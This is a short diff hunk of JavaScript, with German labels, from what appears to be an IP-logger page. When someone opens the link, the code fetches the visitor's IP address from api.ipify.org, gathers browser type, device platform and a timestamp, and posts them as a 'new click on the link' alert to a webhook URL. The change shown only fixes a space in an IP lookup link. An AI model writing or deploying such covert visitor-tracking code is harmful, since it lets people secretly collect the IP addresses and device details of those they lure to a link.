@@ -8,7 +8,7 @@ fetch("https://api.ipify.org?format=json")
     const platform = navigator.platform
     const zeitstempel = new Date().toLocaleString("de-DE");
     const payload = {
-      content: `# 📨 NEUER KLICK AUF DEN LINK!\n**📌 IP-Addresse:** \`${ip}\`\n**🌏 Browsertyp:** ${browser}\n**📱 Gerätetyp:** ${platform}\n**⏰ Uhrzeit:** ${zeitstempel}\n**ℹ️ Weitere Informationen:** <https://whatismyipaddress.com/ip/ ${ip}>`
+      content: `# 📨 NEUER KLICK AUF DEN LINK!\n**📌 IP-Addresse:** \`${ip}\`\n**🌏 Browsertyp:** ${browser}\n**📱 Gerätetyp:** ${platform}\n**⏰ Uhrzeit:** ${zeitstempel}\n**ℹ️ Weitere Informationen:** <https://whatismyipaddress.com/ip/${ip}>`
     };
 
     fetch(webhookUrl, {
